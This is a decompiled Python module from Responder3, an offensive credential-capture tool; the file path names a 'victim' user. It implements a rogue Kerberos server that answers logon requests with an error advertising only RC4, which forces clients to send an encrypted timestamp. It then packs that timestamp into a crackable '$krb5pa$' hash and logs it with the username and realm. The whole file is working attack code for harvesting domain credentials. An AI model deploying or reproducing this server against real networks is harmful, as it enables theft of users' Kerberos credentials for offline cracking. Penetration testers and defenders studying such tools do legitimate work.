# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: C:\Users\victim\Desktop\Responder3\responder3\servers\KERBEROS.py
# Compiled at: 2019-04-29 07:33:30
# Size of source mod 2**32: 3266 bytes
import logging, asyncio
from responder3.core.logging.logger import *
from responder3.core.asyncio_helpers import R3ConnectionClosed
from responder3.core.commons import *
from responder3.protocols.KerberosV5 import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession

class KERBEROSSession(ResponderServerSession):

    def __init__(self, connection, log_queue):
        ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
        self.parser = KerberosParser

    def __repr__(self):
        t = '== KerberosSession ==\r\n'
        return t


class KERBEROS(ResponderServer):

    def init(self):
        self.parse_settings()

    def parse_settings(self):
        pass

    async def request_preauth(self, realm):
        """
                Sending back kerberos error message to force client to yeild the encripted timestamp.
                We are sending RC4 cipher as the only encryption type, you may want to extend it to your needs
                Be careful, for AES enctype you'd need to send additional data (salt) as well!
                
                TODO: e-data field needs to be extended to match windows specs
                """
        now = datetime.datetime.utcnow()
        ed = ETYPE_INFO2([ETYPE_INFO2_ENTRY({'etype': EncryptionType.ARCFOUR_HMAC_MD5.value})])
        pa = PA_DATA({'padata-type':PaDataType.ETYPE_INFO2.value,  'padata-value':ed.dump()})
        t = {}
        t['pvno'] = krb5_pvno
        t['msg-type'] = MESSAGE_TYPE.KRB_ERROR.value
        t['error-code'] = 25
        t['stime'] = now
        t['susec'] = now.microsecond
        t['realm'] = realm
        t['sname'] = PrincipalName({'name-type':NAME_TYPE.PRINCIPAL.value,  'name-string':['krbtgt', realm]})
        t['e-data'] = METHOD_DATA([pa]).dump()
        error = KRB_ERROR(t).dump()
        data = len(error).to_bytes(4, byteorder='big', signed=False)
        self.cwriter.write(data + error)
        await self.cwriter.drain()

    @r3trafficlogexception
    async def run(self):
        while not self.shutdown_evt.is_set():
            try:
                result = await (asyncio.gather)(*[asyncio.wait_for((self.session.parser.from_streamreader(self.creader)), timeout=None)], **{'return_exceptions': True})
            except asyncio.CancelledError as e:
                try:
                    raise e
                finally:
                    e = None
                    del e

            if isinstance(result[0], R3ConnectionClosed):
                return
            elif isinstance(result[0], Exception):
                raise result[0]
            else:
                msg = result[0]
            asreq = msg.native
            realm = asreq['req-body']['realm']
            cname = asreq['req-body']['cname']['name-string'][0]
            for padata in asreq['padata']:
                if padata['padata-type'] == int(PADATA_TYPE('ENC-TIMESTAMP')):
                    edata = EncryptedData.load(padata['padata-value']).native
                    etype = edata['etype']
                    cipher = edata['cipher'].hex()
                    fullhash = '$krb5pa$%s$%s$%s$dummy$%s' % (etype, cname, realm, cipher)
                    cred = Credential('krb5pa', domain=realm,
                      username=cname,
                      fullhash=fullhash)
                    await self.logger.credential(cred)
                    return

            await self.request_preauth(realm)
            return